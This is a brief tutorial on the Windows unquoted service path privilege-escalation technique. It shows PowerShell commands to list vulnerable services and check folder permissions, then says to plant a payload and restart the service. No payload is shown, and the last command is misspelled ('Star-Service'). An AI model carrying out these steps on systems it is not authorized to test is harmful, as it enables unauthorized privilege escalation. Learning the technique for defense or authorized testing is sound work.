# Overview
Unquoted service paths are paths that are not properly enclosed in quotation marks. For example :
***C:\Program Files\secrets\Example program*** VS ***"C:\Program Files\secrets\Example program"***

**This will lead Windows to search for the program in following directories**

*C:\Program.exe

*C:\Program Files\secrets\Example.exe

*C:\Program Files\secrets\Example program.exe

This leads to confusion it thinks the user entered multiple arguments in the command line which makes the CreateProcess function search for the program in each one of these directories

# Step one
Finding unquoted service path using powershell
<pre>Get-CimInstance -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode |
    Where-Object { $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*' } |
    Select-Object Name, DisplayName, StartMode, PathName
</pre>

**To exploit this vulnerablity, you should be able to modify one of the folders listed in there**
Let's start by checking permision and once we find a folder we can edit, we put our payload there.
Stop the service then start the service again

<pre>Get-Acl "C:\Program Files" | Format-List
</pre>


***Stop service, then start it again**
<pre>Stop-Service -Name "ServiceName"</pre>
<pre>Star-Service -Name "ServiceName"</pre>
